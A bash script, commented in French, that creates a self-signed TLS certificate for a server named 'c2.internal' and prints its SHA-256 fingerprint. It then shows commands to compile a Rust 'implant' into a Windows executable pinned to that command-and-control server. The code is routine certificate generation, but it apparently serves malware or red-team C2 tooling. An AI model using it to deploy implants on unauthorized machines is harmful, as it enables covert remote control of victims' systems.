#!/usr/bin/env bash
# Génère un certificat TLS auto-signé et affiche l'empreinte SHA-256
# Usage : ./keygen.sh [CN]
# Résultat : certs/server.crt + certs/server.key + empreinte affichée

set -euo pipefail
CN="${1:-c2.internal}"
DAYS=3650
DIR="certs"

mkdir -p "$DIR"

# Génère clé + certificat auto-signé
openssl req -x509 -newkey rsa:4096 -sha256 -days "$DAYS" \
    -nodes -keyout "$DIR/server.key" -out "$DIR/server.crt" \
    -subj "/CN=$CN" \
    -addext "subjectAltName=IP:127.0.0.1,DNS:$CN"

# Empreinte SHA-256 du certificat DER (pour C2_FINGERPRINT dans l'implant)
FINGERPRINT=$(openssl x509 -in "$DIR/server.crt" -outform DER \
    | openssl dgst -sha256 -hex | awk '{print $2}')

echo ""
echo "=== Certificat généré ==="
echo "  Fichiers : $DIR/server.crt  $DIR/server.key"
echo "  CN       : $CN"
echo "  Validité : $DAYS jours"
echo ""
echo "=== Empreinte C2 (à utiliser à la compilation) ==="
echo "  C2_FINGERPRINT=$FINGERPRINT"
echo ""
echo "=== Compilation de l'implant ==="
echo "  source ~/.cargo/env"
echo "  cd $(pwd)"
echo "  C2_URL=https://<IP_C2>:8443 C2_FINGERPRINT=$FINGERPRINT \\"
echo "    cargo build --release -p implant --target x86_64-pc-windows-gnu"
echo ""
echo "  Binaire : target/x86_64-pc-windows-gnu/release/implant.exe"
